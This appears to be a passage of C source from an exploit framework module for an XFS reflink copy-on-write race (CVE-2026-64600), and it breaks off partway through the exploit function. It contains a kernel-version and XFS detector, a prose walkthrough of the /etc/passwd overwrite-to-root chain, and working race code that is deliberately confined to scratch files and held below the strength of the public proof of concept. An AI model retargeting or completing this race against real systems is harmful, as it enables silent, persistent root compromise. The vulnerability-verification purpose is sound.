/*
 * refluxfs_cve_2026_64600 — SKELETONKEY module
 *
 * CVE-2026-64600 — "RefluXFS", a time-of-check/time-of-use race in the XFS
 * reflink copy-on-write path (fs/xfs/xfs_iomap.c :: xfs_direct_write_iomap_begin
 * → fs/xfs/xfs_reflink.c :: xfs_reflink_allocate_cow / xfs_reflink_fill_cow_hole
 * / xfs_find_trim_cow_extent). A direct-I/O writer reads the data-fork extent
 * map under ILOCK, then DROPS ILOCK to allocate a transaction (i.e. to wait for
 * log space). On re-acquiring the lock it re-queries the refcount btree at the
 * ORIGINAL physical block number (imap->br_startblock) and never re-reads the
 * data fork. A second O_DIRECT writer — holding only the coarser IOLOCK — can
 * complete an entire CoW cycle in that window (allocate block Y, write it,
 * remap via xfs_reflink_end_cow), leaving the first writer's imap pointing at a
 * block that is now owned solely by the reflink SOURCE. The stale lookup returns
 * refcount == 1, the writer concludes the block is private, and writes to it in
 * place — landing attacker data on the source file's on-disk blocks.
 *
 * The primitive is therefore NOT memory corruption: it is an arbitrary
 * overwrite of the on-disk contents of any file the attacker can READ on a
 * reflink-enabled XFS volume. That has three consequences worth stating plainly,
 * because they drive every design decision below:
 *   1. No KASLR/SMEP/SMAP/offsets/ROP are involved, so there is nothing to
 *      port per kernel build and no --full-chain offset table entry to fill.
 *      Qualys notes SELinux enforcing, container boundaries and seccomp are all
 *      equally irrelevant.
 *   2. The write is applied UNDER the victim inode. No write(2) is ever issued
 *      against it, so its mtime/ctime/size do not change — file-integrity
 *      monitoring and `-w /etc/passwd -p wa` auditd watches DO NOT FIRE. See
 *      the detection-rule commentary at the bottom of this file.
 *   3. The corruption is persistent on disk and survives reboot.
 * The public demonstration (RHEL 10.2) reflink-clones /etc/passwd into /var/tmp,
 * races concurrent direct-I/O writes against the clone, and thereby rewrites
 * /etc/passwd itself to strip root's password → `su` → root.
 *
 * Reachable by ANY unprivileged local user: no capability, no user namespace,
 * no crafted/mountable filesystem image, no special CONFIG beyond CONFIG_XFS_FS
 * built with reflink. The only preconditions are an XFS filesystem mounted with
 * reflink=1 (the mkfs.xfs default since xfsprogs 5.1) that the user can write
 * to, plus read access to whatever file is being targeted. That makes the
 * exposed population distro-shaped rather than kernel-shaped: RHEL 8/9/10,
 * CentOS Stream 8/9/10, Rocky/AlmaLinux 8/9/10, Oracle Linux 8/9/10 (RHCK +
 * UEK), CloudLinux 8/9/10, Fedora Server >= 31 and Amazon Linux 2023 (plus AL2
 * AMIs from 2022-12) ship XFS+reflink by DEFAULT and are exploitable out of the
 * box; Debian, Ubuntu, Fedora Workstation, SLES, openSUSE and Arch default to
 * ext4/btrfs and are NOT reachable unless an XFS volume was added deliberately.
 * RHEL/CentOS 7 was never affected (kernel 3.10 predates reflink entirely).
 *
 * Introduced in 4.11 (2017-02, commit 3c68d44a2b49 "xfs: allocate direct I/O
 * COW blocks in iomap_begin") — a nine-year exposure window. Fixed by
 * 2f4acd0fcd862e22eab45690ec2c08c80b6ef2e7 ("xfs: resample the data fork
 * mapping after cycling ILOCK"), merged 2026-07-16 for 7.2-rc4; the CNA record
 * lists stable backports 7.1.4 / 6.18.39 / 6.12.96 (commits e705d81a7193,
 * 206c09b04dc5, 44f891bc0889). Class is CWE-362 (race) yielding CWE-367
 * (TOCTOU); NVD had published neither a CWE nor a CVSS vector at time of
 * writing, and the CVE is NOT in CISA KEV (disclosed 2026-07-22). Discovered by
 * the Qualys Threat Research Unit; the advisory credits model-assisted kernel
 * analysis done with Anthropic. See NOTICE.md.
 *
 * STATUS: 🟡 TRIGGER (reconstructed) — VM-VERIFIED, and deliberately NOT
 *   weaponised. Confirmed 2026-07-23 on Rocky Linux 9.8 /
 *   5.14.0-687.10.1.el9_8.0.1.x86_64 (stock installer layout: root on XFS with
 *   reflink=1) under qemu/KVM, 6 vCPUs: detect() returns VULNERABLE, the
 *   --active FICLONE witness confirms reflink, and phase A observes
 *   FIEMAP_EXTENT_SHARED on a real XFS shared extent. The UNDERLYING BUG was
 *   separately confirmed winnable on that kernel — 4/4 runs, first divergence
 *   after 69-494 rounds inside a 60s budget — using a VM-only harness driven at
 *   the public PoC's parameters (32 writers / 8 helpers; see
 *   tools/verify-vm/refluxfs_verify.c). The SHIPPED trigger below is
 *   deliberately under-driven (8 writers / 2 helpers / 2s) and did NOT win in
 *   that budget on the same vulnerable kernel — that is the intended behaviour,
 *   not a defect, and is why a non-win must never be read as "patched".
 *   exploit() forks an isolated child that works ONLY inside a private scratch
 *   directory it creates on an XFS mount, on two files it owns, in two phases:
 *     (A) DETERMINISTIC + SAFE — writes a donor file, FICLONE-clones it, and
 *         confirms via FIEMAP that the clone's extent carries
 *         FIEMAP_EXTENT_SHARED. That is a direct, read-only observation that
 *         the refcount-btree state the bug misjudges (refcount > 1 on a shared
 *         extent) actually exists on this filesystem, and that O_DIRECT opens
 *         succeed — i.e. the vulnerable path is reachable here. Reflink cloning
 *         is an ordinary supported operation; this phase is safe on any kernel.
 *     (B) HARD-BOUNDED window exercise — races a small number of concurrent
 *         O_DIRECT writes against the clone while helper threads cycle
 *         ftruncate/fdatasync to keep the ILOCK dropping for log space, then
 *         STOPS. It then reads the DONOR back with O_DIRECT (bypassing the page
 *         cache, which would otherwise hide the corruption) and reports whether
 *         the donor's on-disk bytes changed — the honest, self-contained
 *         witness that the race was won.
 *   It is deliberately UNDER-DRIVEN relative to the public PoC (8 writers vs 32,
 *   2 helpers vs 8, 2s cap), and — the important part — it NEVER clones or
 *   targets a file it does not own. The step that makes this root, cloning a
 *   root-owned file such as /etc/passwd and racing writes onto ITS shared
 *   blocks, is documented but NOT bundled: doing so would persistently rewrite
 *   a system file on disk with no way to undo it. Returns EXPLOIT_FAIL always;
 *   it never claims root it did not get.
 *
 *   Note the asymmetry with the corpus's other reconstructed race triggers: a
 *   won race here corrupts 4 KiB of the operator's OWN scratch file and cannot
 *   touch kernel memory, so unlike bad_epoll (frees a live struct file) and
 *   ghostlock (kernel-stack UAF → near-arbitrary write → panic) there is no
 *   oops, no silent kernel destabilisation and no panic risk. That is why this
 *   module ranks well above them in --auto safety despite being unverified.
 *
 * detect() is a version gate AND a real precondition probe, because unlike a
 *   pure kernel race this bug's reachability is observable safely: it requires
 *   a writable directory on a mounted XFS filesystem (checked via statfs(2)
 *   f_type == XFS_SUPER_MAGIC — NOT merely "FICLONE works", since btrfs also
 *   implements FICLONE and is not affected). Without one it returns
 *   PRECOND_FAIL, which is the correct verdict on a default Debian/Ubuntu host.
 *   Under --active it additionally performs the FICLONE witness to confirm
 *   reflink=1 rather than assuming the mkfs default. Override the probe with
 *   SKELETONKEY_XFS_ASSUME_REFLINK=1 (force reachable) / 0 (force unreachable)
 *   when you know the fleet's storage layout better than a local probe can —
 *   this also drives the unit tests.
 *
 *   Honesty caveat, and it is a big one for this CVE specifically: the affected
 *   population is overwhelmingly RHEL-family, and those vendors backport fixes
 *   WITHOUT bumping the upstream base version (a patched RHEL 8 kernel still
 *   reports 4.18.0-xxx.el8). An upstream-version gate cannot see that, so on
 *   rpm-family hosts a VULNERABLE verdict is a statement about the upstream
 *   base version only; detect() says so explicitly rather than pretending
 *   otherwise. Confirm against the vendor erratum (RHSA/ELSA/ALSA/RLSA).
 *
 * arch_support: any — trigger and real-world exploitation are both pure
 *   syscall/filesystem work (FICLONE, O_DIRECT pwrite, ftruncate, fdatasync)
 *   with no offsets, no shellcode and no arch-specific structure layouts.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"

#include <stdint.h>
#include <stdatomic.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/statfs.h>
#include <sys/types.h>
#include <sys/wait.h>

/* Filesystem/ioctl constants — defined defensively. <linux/fs.h> and
 * <linux/fiemap.h> are not present on every build host and can clash with
 * libc headers; the numbers below are stable uapi. */
#ifndef XFS_SUPER_MAGIC
#define XFS_SUPER_MAGIC          0x58465342   /* "XFSB" */
#endif
#ifndef RFX_FICLONE
#define RFX_FICLONE              _IOW(0x94, 9, int)
#endif
#define RFX_FIEMAP_FLAG_SYNC     0x00000001u
#define RFX_FIEMAP_EXTENT_SHARED 0x00002000u  /* extent is shared: refcount > 1 */

/* struct fiemap / struct fiemap_extent, mirrored so we can build the
 * FS_IOC_FIEMAP ioctl number without the kernel header. The _IOWR size field
 * MUST equal sizeof(struct fiemap) == 32, asserted below. */
struct rfx_fiemap_hdr {
    uint64_t fm_start;
    uint64_t fm_length;
    uint32_t fm_flags;
    uint32_t fm_mapped_extents;
    uint32_t fm_extent_count;
    uint32_t fm_reserved;
};
struct rfx_fiemap_extent {
    uint64_t fe_logical;
    uint64_t fe_physical;
    uint64_t fe_length;
    uint64_t fe_reserved64[2];
    uint32_t fe_flags;
    uint32_t fe_reserved[3];
};
_Static_assert(sizeof(struct rfx_fiemap_hdr) == 32,
               "fiemap header must be 32 bytes or FS_IOC_FIEMAP encodes wrong");
_Static_assert(sizeof(struct rfx_fiemap_extent) == 56,
               "fiemap extent must be 56 bytes to match uapi layout");

#define RFX_FIEMAP_MAX_EXTENTS 8
struct rfx_fiemap_req {
    struct rfx_fiemap_hdr    hdr;
    struct rfx_fiemap_extent ext[RFX_FIEMAP_MAX_EXTENTS];
};
#define RFX_FS_IOC_FIEMAP _IOWR('f', 11, struct rfx_fiemap_hdr)

/* ------------------------------------------------------------------
 * Kernel-range table. Mainline fix 2f4acd0fcd86 landed in 7.2-rc4
 * (merged 2026-07-16); the CNA record lists stable backports on the three
 * branches below. A branch with an exact entry is patched iff
 * host.patch >= entry.patch; any branch strictly newer than EVERY entry
 * (i.e. 7.2+) inherits the mainline fix; every other branch — the 6.6 / 6.1 /
 * 5.15 / 5.14 / 5.10 / 4.19 / 4.18 LTS lines and the EOL branches in between —
 * is still vulnerable with no upstream stable fix published at time of writing.
 * kernel_range_is_patched() implements exactly that.
 *
 * Distro vendor branches (RHEL 4.18.0-*.el8, 5.14.0-*.el9, UEK, Amazon) carry
 * the fix without moving these numbers; see the rpm-family caveat in detect().
 * Extend the table as more branches publish backports — tools/
 * refresh-kernel-ranges.py flags the drift. Authoritative source: the Linux
 * kernel CNA record (git.kernel.org/stable/c/<hash>).
 * ------------------------------------------------------------------ */
static const struct kernel_patched_from refluxfs_patched_branches[] = {
    {6, 12, 96},   /* 6.12 LTS — 44f891bc0889 */
    {6, 18, 39},   /* 6.18     — 206c09b04dc5 */
    {7,  1,  4},   /* 7.1      — e705d81a7193; 7.2+ inherits mainline 2f4acd0fcd86 */
};

static const struct kernel_range refluxfs_range = {
    .patched_from = refluxfs_patched_branches,
    .n_patched_from = sizeof(refluxfs_patched_branches) /
                      sizeof(refluxfs_patched_branches[0]),
};

/* ------------------------------------------------------------------
 * Target discovery: a writable directory on a mounted XFS filesystem.
 *
 * We check the SUPERBLOCK MAGIC rather than trusting a successful FICLONE,
 * because btrfs implements FICLONE too and is not affected by this CVE. The
 * candidate list covers the conventional scratch dirs (the public PoC used
 * /var/tmp) and then anything XFS that /proc/mounts reports, which catches
 * layouts where only /home or a data volume is XFS.
 * ------------------------------------------------------------------ */

#define RFX_SCRATCH_PREFIX "skeletonkey-refluxfs-"

/* Buffer tiers. Directory buffers are deliberately smaller than the PATH_MAX
 * file-path buffers built from them, so every snprintf() below is provably
 * non-truncating (and -Wformat-truncation stays quiet without pragmas):
 *   mount dir (<=1023) + "/" + prefix + "XXXXXX"  fits RFX_SCRATCH_MAX
 *   scratch  (<=2047) + "/donor"|"/clone"         fits PATH_MAX
 *   mount dir (<=1023) + "/" + d_name (<=255)     fits PATH_MAX */
#define RFX_DIR_MAX      1024   /* an XFS mountpoint / scratch parent */
#define RFX_SCRATCH_MAX  2048   /* the private mkdtemp() directory */

static bool rfx_dir_is_writable_xfs(const char *dir)
{
    if (!dir || !*dir) return false;
    struct statfs sfs;
    if (statfs(dir, &sfs) != 0) return false;
    if ((unsigned long)sfs.f_type != (unsigned long)XFS_SUPER_MAGIC) return false;
    return access(dir, W_OK | X_OK) == 0;
}

/* Append every xfs mountpoint in /proc/mounts to the caller's candidate
 * callback. Mountpoints are octal-escaped in that file; we unescape the
 * cases that actually occur (\040 space, \011 tab, \012 newline, \134 \). */
static void rfx_unescape_mount(char *s)
{
    char *r = s, *w = s;
    while (*r) {
        if (r[0] == '\\' && r[1] && r[2] && r[3]) {
            int a = r[1] - '0', b = r[2] - '0', c = r[3] - '0';
            if (a >= 0 && a <= 7 && b >= 0 && b <= 7 && c >= 0 && c <= 7) {
                *w++ = (char)((a << 6) | (b << 3) | c);
                r += 4;
                continue;
            }
        }
        *w++ = *r++;
    }
    *w = '\0';
}

/* Find a writable directory on an XFS filesystem.
 *
 * Returns 1 and fills `out` when a usable target exists, 0 when none does.
 * *assumed is set true when the answer came from SKELETONKEY_XFS_ASSUME_REFLINK
 * rather than a real statfs() match, so callers can report the difference
 * honestly instead of implying they measured something they did not. */
static int rfx_find_xfs_dir(char *out, size_t outsz, bool *assumed)
{
    if (assumed) *assumed = false;
    if (out && outsz) out[0] = '\0';

    const char *ov = getenv("SKELETONKEY_XFS_ASSUME_REFLINK");
    if (ov && *ov == '0') {
        if (assumed) *assumed = true;
        return 0;                      /* operator asserts: no reflink XFS here */
    }

    const char *fixed[] = {
        getenv("TMPDIR"), "/var/tmp", "/tmp", getenv("HOME"),
    };
    for (size_t i = 0; i < sizeof(fixed) / sizeof(fixed[0]); i++) {
        if (fixed[i] && rfx_dir_is_writable_xfs(fixed[i])) {
            snprintf(out, outsz, "%s", fixed[i]);
            return 1;
        }
    }

    /* Anything else XFS that we can write to. */
    FILE *f = fopen("/proc/mounts", "re");
    if (f) {
        char line[1024];
        while (fgets(line, sizeof line, f)) {
            char dev[256], mp[512], fstype[64];
            if (sscanf(line, "%255s %511s %63s", dev, mp, fstype) != 3) continue;
            if (strcmp(fstype, "xfs") != 0) continue;
            rfx_unescape_mount(mp);
            if (rfx_dir_is_writable_xfs(mp)) {
                snprintf(out, outsz, "%s", mp);
                fclose(f);
                return 1;
            }
        }
        fclose(f);
    }

    if (ov && *ov == '1') {
        /* Operator asserts the target exists even though we could not see it
         * (e.g. scanning a fleet from a host whose own storage differs).
         * Hand back a conventional scratch dir; exploit() reports honestly if
         * it turns out not to be usable. */
        snprintf(out, outsz, "%s", "/var/tmp");
        if (assumed) *assumed = true;
        return 1;
    }
    return 0;
}

/* Non-destructive reflink witness: clone a 4 KiB file inside `dir` and remove
 * both files immediately. Returns 1 if FICLONE succeeded (reflink=1 confirmed),
 * 0 if the filesystem refused it (reflink=0 → the CoW path is unreachable),
 * -1 if we could not decide. Only called when ctx->active_probe is set. */
static int rfx_reflink_witness(const char *dir)
{
    /* pid-qualified so two concurrent skeletonkey runs (a fleet scan looping
     * over hosts, or --auto's forked per-module detects) cannot unlink each
     * other's probe files mid-check and produce a bogus PRECOND_FAIL. */
    char src[PATH_MAX], dst[PATH_MAX];
    snprintf(src, sizeof src, "%s/" RFX_SCRATCH_PREFIX "probe.%ld.src",
             dir, (long)getpid());
    snprintf(dst, sizeof dst, "%s/" RFX_SCRATCH_PREFIX "probe.%ld.dst",
             dir, (long)getpid());

    int rc = -1;
    int sfd = open(src, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (sfd < 0) return -1;

    static const char blk[4096] = { 0 };
    if (write(sfd, blk, sizeof blk) != (ssize_t)sizeof blk) { close(sfd); unlink(src); return -1; }
    (void)fsync(sfd);

    int dfd = open(dst, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (dfd >= 0) {
        errno = 0;
        if (ioctl(dfd, RFX_FICLONE, sfd) == 0) {
            rc = 1;
        } else if (errno == EOPNOTSUPP || errno == EINVAL || errno == EXDEV ||
                   errno == ENOTTY) {
            rc = 0;                    /* filesystem has no reflink support */
        }
        close(dfd);
        unlink(dst);
    }
    close(sfd);
    unlink(src);
    return rc;
}

static skeletonkey_result_t refluxfs_detect(const struct skeletonkey_ctx *ctx)
{
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] refluxfs: host fingerprint missing kernel "
                            "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Direct-I/O CoW block allocation in iomap_begin — the code the race lives
     * in — arrived in 4.11 (3c68d44a2b49). RHEL/CentOS 7's 3.10 predates
     * reflink entirely and was never affected. */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 4, 11, 0)) {
        if (!ctx->json)
            fprintf(stderr, "[i] refluxfs: kernel %s predates XFS direct-I/O CoW "
                            "(introduced 4.11) — not affected\n", v->release);
        return SKELETONKEY_OK;
    }

    /* A patched kernel is not vulnerable regardless of storage layout —
     * decide that first so the verdict is deterministic. */
    if (kernel_range_is_patched(&refluxfs_range, v)) {
        if (!ctx->json)
            fprintf(stderr, "[+] refluxfs: kernel %s is patched (>= 7.1.4 / "
                            "6.18.39 / 6.12.96 on-branch, or 7.2+ mainline)\n",
                    v->release);
        return SKELETONKEY_OK;
    }

    /* Vulnerable kernel. The bug is only reachable where an XFS filesystem
     * with reflink is mounted and writable — on a default Debian/Ubuntu host
     * (ext4) there is nothing to attack, and that is PRECOND_FAIL, not
     * VULNERABLE. */
    char dir[RFX_DIR_MAX];
    bool assumed = false;
    if (!rfx_find_xfs_dir(dir, sizeof dir, &assumed)) {
        if (!ctx->json) {
            fprintf(stderr, "[i] refluxfs: kernel %s is in the vulnerable range "
                            "but no writable XFS filesystem is mounted%s — the "
                            "reflink CoW path is not reachable here\n",
                    v->release,
                    assumed ? " (forced by SKELETONKEY_XFS_ASSUME_REFLINK=0)" : "");
            fprintf(stderr, "[i] refluxfs: XFS+reflink is the default on RHEL/"
                            "CentOS/Rocky/Alma/Oracle 8-10, Fedora Server >= 31 "
                            "and Amazon Linux 2023; if this fleet has XFS "
                            "elsewhere, re-run with "
                            "SKELETONKEY_XFS_ASSUME_REFLINK=1\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    /* Under --active, confirm reflink is actually enabled rather than assuming
     * the mkfs.xfs default. reflink=0 means no shared extents can exist, so the
     * refcount check the bug fumbles is never reached. */
    if (ctx->active_probe && !assumed) {
        int w = rfx_reflink_witness(dir);
        if (w == 0) {
            if (!ctx->json)
                fprintf(stderr, "[i] refluxfs: XFS at %s has reflink DISABLED "
                                "(FICLONE refused) — no shared extents possible, "
                                "bug not reachable here\n", dir);
            return SKELETONKEY_PRECOND_FAIL;
        }
        if (w == 1 && !ctx->json)
            fprintf(stderr, "[+] refluxfs: reflink CONFIRMED on XFS at %s "
                            "(FICLONE accepted)\n", dir);
        if (w < 0 && !ctx->json)
            fprintf(stderr, "[i] refluxfs: reflink probe inconclusive at %s — "
                            "falling back to the version verdict\n", dir);
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] refluxfs: VULNERABLE — kernel %s below the fix on "
                        "its branch, writable XFS at %s%s; the reflink CoW "
                        "ILOCK-cycling race lets any unprivileged user overwrite "
                        "the on-disk contents of any readable file (no userns, "
                        "no capability, no offsets)\n",
                v->release, dir,
                assumed ? " (asserted via SKELETONKEY_XFS_ASSUME_REFLINK=1)"
                        : "");
        if (!ctx->active_probe)
            fprintf(stderr, "[i] refluxfs: reflink=1 assumed (the mkfs.xfs "
                            "default since xfsprogs 5.1) — re-run with --active "
                            "to confirm it empirically via FICLONE\n");
        if (ctx->host && ctx->host->is_rpm_family)
            fprintf(stderr, "[!] refluxfs: rpm-family host — RHEL/Oracle/Rocky/"
                            "Alma backport this fix WITHOUT bumping the upstream "
                            "version (a patched el8 kernel still reports "
                            "4.18.0-*), so this verdict reflects the upstream "
                            "base version only. Confirm against the vendor "
                            "erratum (RHSA/ELSA/ALSA/RLSA).\n");
        fprintf(stderr, "[i] refluxfs: no runtime mitigation exists — reflink is "
                        "a superblock feature that cannot be turned off on a "
                        "live filesystem, and O_DIRECT cannot be disabled. Patch "
                        "the kernel and reboot.\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ------------------------------------------------------------------
 * Reconstructed reachability trigger (deliberately under-driven, and
 * deliberately confined to files we own).
 *
 * Shape of the public PoC, minus the part that makes it an attack:
 *   PoC:  FICLONE /etc/passwd -> /var/tmp/clone;  32 x O_DIRECT 4K write @0
 *         + 8 x ftruncate/fdatasync helpers  =>  /etc/passwd rewritten on disk
 *   here: FICLONE  ourdonor  -> ourclone;         8 x O_DIRECT 4K write @0
 *         + 2 x ftruncate/fdatasync helpers  =>  at worst OUR donor is rewritten
 *
 * Phase A confirms, read-only and deterministically, that the exact filesystem
 * state the bug misjudges exists here: a shared extent (FIEMAP_EXTENT_SHARED,
 * i.e. refcount > 1) and a working O_DIRECT path into
 * xfs_direct_write_iomap_begin. Phase B races writers against the clone while
 * helpers cycle ftruncate/fdatasync to keep the transaction allocator dropping
 * ILOCK to wait for log space — the window the race needs — then stops and
 * checks the donor's on-disk bytes with an O_DIRECT read (a buffered read would
 * be served from the donor's page cache, which the corruption bypasses, and
 * would hide a win).
 *
 * We do NOT clone or target any file we do not own, do NOT grind the race to a
 * win, and do NOT touch /etc/passwd or any other system file. A won race here
 * damages 4 KiB of our own scratch file and nothing else.
 * ------------------------------------------------------------------ */
#define RFX_BLK              4096u  /* 4 KiB — the PoC's write size */
#define RFX_ALIGN            4096u  /* satisfies 512b and 4Kn O_DIRECT alignment */
#define RFX_DONOR_BYTE       0x5a   /* 'Z' — donor's known-good pattern */
#define RFX_ATTACKER_BYTE    0x41   /* 'A' — what the racing writers push */
#define RFX_RACE_WRITERS     8      /* public PoC uses 32 */
#define RFX_RACE_HELPERS     2      /* public PoC uses 8 */
#define RFX_RACE_ROUNDS      16     /* hard iteration cap */
#define RFX_RACE_BUDGET_SECS 2      /* hard wall-clock cap */

/* Child exit codes — mapped to operator-facing messages in exploit(). */
#define RFX_RC_SHARED_NO_WIN 100  /* shared extent confirmed, race not won */
#define RFX_RC_NO_SHARE      101  /* could not establish/observe a shared extent */
#define RFX_RC_SHARED_WIN    102  /* shared extent confirmed AND donor diverged */
#define RFX_RC_SETUP_FAIL    103  /* no usable scratch dir / O_DIRECT unavailable */

struct rfx_race {
    char        clone_path[PATH_MAX];
    atomic_int  gate;      /* 0 = hold, 1 = go */
    atomic_int  stop;      /* helpers exit when set */
};

static void *rfx_writer_fn(void *arg)
{
    struct rfx_race *r = (struct rfx_race *)arg;
    int fd = open(r->clone_path, O_RDWR | O_DIRECT);
    if (fd < 0) return NULL;

    void *buf = NULL;
    if (posix_memalign(&buf, RFX_ALIGN, RFX_BLK) != 0) { close(fd); return NULL; }
    memset(buf, RFX_ATTACKER_BYTE, RFX_BLK);

    while (!atomic_load_explicit(&r->gate, memory_order_acquire))
        sched_yield();
    (void)pwrite(fd, buf, RFX_BLK, 0);

    free(buf);
    close(fd);
    return NULL;
}

/* Keep the transaction allocator busy so the ILOCK keeps getting dropped while
 * waiting for log space. Sizes alternate between one and two blocks — both keep
 * byte range [0, RFX_BLK) intact, so the racing writers' target never moves. */
static void *rfx_helper_fn(void *arg)
{
    struct rfx_race *r = (struct rfx_race *)arg;
    int fd = open(r->clone_path, O_RDWR);
    if (fd < 0) return NULL;

    while (!atomic_load_explicit(&r->gate, memory_order_acquire))
        sched_yield();
    while (!atomic_load_explicit(&r->stop, memory_order_acquire)) {
        (void)ftruncate(fd, (off_t)RFX_BLK * 2);
        (void)fdatasync(fd);
        (void)ftruncate(fd, (off_t)RFX_BLK);
        (void)fdatasync(fd);
    }
    close(fd);
    return NULL;
}

/* Read `path`'s first block with O_DIRECT and report whether every byte still
 * equals `expect`. Returns 1 if the content diverged, 0 if intact, -1 if we
 * could not tell. O_DIRECT matters: the corruption lands under the inode, so a
 * buffered read would return the stale (correct-looking) cached page. */
static int rfx_content_diverged(const char *path, unsigned char expect)
{
    int fd = open(path, O_RDONLY | O_DIRECT);
    if (fd < 0) return -1;

    void *buf = NULL;
    if (posix_memalign(&buf, RFX_ALIGN, RFX_BLK) != 0) { close(fd); return -1; }

    int rc = -1;
    ssize_t n = pread(fd, buf, RFX_BLK, 0);
    if (n == (ssize_t)RFX_BLK) {
        const unsigned char *p = (const unsigned char *)buf;
        rc = 0;
        for (size_t i = 0; i < RFX_BLK; i++) {
            if (p[i] != expect) { rc = 1; break; }
        }
    }
    free(buf);
    close(fd);
    return rc;
}

/* Does `path`'s first extent report FIEMAP_EXTENT_SHARED? 1 = yes (refcount>1),
 * 0 = no, -1 = could not tell. */
static int rfx_extent_is_shared(const char *path)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;

    struct rfx_fiemap_req req;
    memset(&req, 0, sizeof req);
    req.hdr.fm_start        = 0;
    req.hdr.fm_length       = RFX_BLK;
    req.hdr.fm_flags        = RFX_FIEMAP_FLAG_SYNC;
    req.hdr.fm_extent_count = RFX_FIEMAP_MAX_EXTENTS;

    int rc = -1;
    if (ioctl(fd, RFX_FS_IOC_FIEMAP, &req) == 0) {
        rc = 0;
        uint32_t n = req.hdr.fm_mapped_extents;
        if (n > RFX_FIEMAP_MAX_EXTENTS) n = RFX_FIEMAP_MAX_EXTENTS;
        for (uint32_t i = 0; i < n; i++) {
            if (req.ext[i].fe_flags & RFX_FIEMAP_EXTENT_SHARED) { rc = 1; break; }
        }
    }
    close(fd);
    return rc;
}

/* Build donor + reflinked clone inside `scratch`. Returns 0 on success. */
static int rfx_build_pair(const char *scratch, char *donor, size_t dsz,
                          char *clone, size_t csz)
{
    snprintf(donor, dsz, "%s/donor", scratch);
    snprintf(clone, csz, "%s/clone", scratch);

    int dfd = open(donor, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (dfd < 0) return -1;

    void *buf = NULL;
    if (posix_memalign(&buf, RFX_ALIGN, RFX_BLK) != 0) { close(dfd); return -1; }
    memset(buf, RFX_DONOR_BYTE, RFX_BLK);
    ssize_t w = pwrite(dfd, buf, RFX_BLK, 0);
    free(buf);
    if (w != (ssize_t)RFX_BLK) { close(dfd); return -1; }
    (void)fsync(dfd);

    int cfd = open(clone, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (cfd < 0) { close(dfd); return -1; }

    /* The shared extent. This — and only this — is the state the bug's stale
     * refcount lookup misjudges. */
    int rc = ioctl(cfd, RFX_FICLONE, dfd) == 0 ? 0 : -1;
    (void)fsync(cfd);
    close(cfd);
    close(dfd);
    return rc;
}

static void rfx_remove_scratch(const char *scratch)
{
    DIR *d = opendir(scratch);
    if (d) {
        struct dirent *e;
        while ((e = readdir(d)) != NULL) {
            if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;
            unlinkat(dirfd(d), e->d_name, 0);
        }
        closedir(d);
    }
    rmdir(scratch);
}

/* One race round against our own clone. Returns 1 if the donor's on-disk bytes
 * diverged (the race was won), 0 if intact, -1 if undetermined. */
static int rfx_race_round(const char *donor, const char *clone)
{
    struct rfx_race r;
    memset(&r, 0, sizeof r);
    snprintf(r.clone_path, sizeof r.clone_path, "%s", clone);

    pthread_t w[RFX_RACE_WRITERS], h[RFX_RACE_HELPERS];
    int nw = 0, nh = 0;

    for (int i = 0; i < RFX_RACE_WRITERS; i++)
        if (pthread_create(&w[nw], NULL, rfx_writer_fn, &r) == 0) nw++;
    for (int i = 0; i < RFX_RACE_HELPERS; i++)
        if (pthread_create(&h[nh], NULL, rfx_helper_fn, &r) == 0) nh++;

    if (nw == 0) {
        atomic_store_explicit(&r.stop, 1, memory_order_release);
        atomic_store_explicit(&r.gate, 1, memory_order_release);
        for (int i = 0; i < nh; i++) pthread_join(h[i], NULL);
        return -1;
    }

    /* Let every thread reach its spin gate, then release them together. */
    usleep(2000);
    atomic_store_explicit(&r.gate, 1, memory_order_release);

    for (int i = 0; i < nw; i++) pthread_join(w[i], NULL);
    atomic_store_explicit(&r.stop, 1, memory_order_release);
    for (int i = 0; i < nh; i++) pthread_join(h[i], NULL);

    return rfx_content_diverged(donor, RFX_DONOR_BYTE);
}

static skeletonkey_result_t refluxfs_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = refluxfs_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] refluxfs: detect() says not vulnerable/reachable; "
                        "refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] refluxfs: already running as root — nothing to do\n");
        return SKELETONKEY_OK;
    }

    if (!ctx->json)
        fprintf(stderr, "[*] refluxfs: reconstructed reachability probe — builds "
                        "a reflinked pair of files WE OWN in a private scratch "
                        "dir, confirms the shared extent via FIEMAP, then races "
                        "%d concurrent O_DIRECT writes against the clone (%d "
                        "ftruncate/fdatasync helpers, %d rounds, %ds cap) and "
                        "stops. It never clones or targets a root-owned file, so "
                        "the /etc/passwd overwrite → su → root chain is NOT "
                        "bundled.\n",
                RFX_RACE_WRITERS, RFX_RACE_HELPERS, RFX_RACE_ROUNDS,
                RFX_RACE_BUDGET_SECS);

    /* Fork-isolated for consistency with the corpus's other race triggers.
     * Unlike them, a won race here cannot touch kernel memory — the blast
     * radius is 4 KiB of our own scratch file. */
    pid_t child = fork();
    if (child < 0) { perror("[-] fork"); return SKELETONKEY_TEST_ERROR; }

    if (child == 0) {
        char dir[RFX_DIR_MAX];
        bool assumed = false;
        if (!rfx_find_xfs_dir(dir, sizeof dir, &assumed)) _exit(RFX_RC_SETUP_FAIL);

